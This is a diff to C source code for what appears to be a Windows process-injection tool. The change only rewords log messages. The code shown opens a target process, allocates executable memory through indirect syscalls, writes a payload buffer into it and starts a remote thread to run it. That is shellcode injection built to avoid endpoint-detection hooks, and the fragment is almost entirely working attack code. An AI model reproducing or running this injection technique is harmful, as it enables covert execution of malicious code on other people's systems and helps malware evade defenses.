@@ -138,21 +138,22 @@ int main(int argc, char* argv[]) {
 
     printf("[*] Successfully opened handle to PID: %u\n", pid);
 
-    printf("[*] Waiting for thread with IndirectSysNtAllocateVirtualMemory.\n");
+    printf("[*] Allocating space using IndirectSysNtAllocateVirtualMemory.\n");
     PVOID bufferAddress = NULL;
 	SIZE_T buffSize = sizeof(buf); 
 	IndirectSysNtAllocateVirtualMemory(pHandle, (PVOID*)&bufferAddress, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
 
-    printf("[*] Waiting for thread with IndirectSysNtWriteVirtualMemory.\n");
+    printf("[*] Writing payload using IndirectSysNtWriteVirtualMemory.\n");
 	SIZE_T bytesWritten;
     IndirectSysNtWriteVirtualMemory(pHandle, bufferAddress, buf, sizeof(buf), &bytesWritten);
 
-    printf("[*] Waiting for thread with IndirectSysNtCreateThreadEx.\n");
+    printf("[*] Creating a new thread using IndirectSysNtCreateThreadEx.\n");
 	HANDLE hThread;	
     IndirectSysNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, pHandle, (LPTHREAD_START_ROUTINE)bufferAddress, NULL, FALSE, 0, 0, 0, NULL);
 	
-    printf("[*] Waiting for thread with IndirectSysNtWaitForSingleObject.\n");
+    printf("[*] Waiting for thread using IndirectSysNtWaitForSingleObject.\n");
 	IndirectSysNtWaitForSingleObject(hThread, FALSE, NULL);
+    
     printf("[+] Process injection complete.\n");
     return 0;
 }
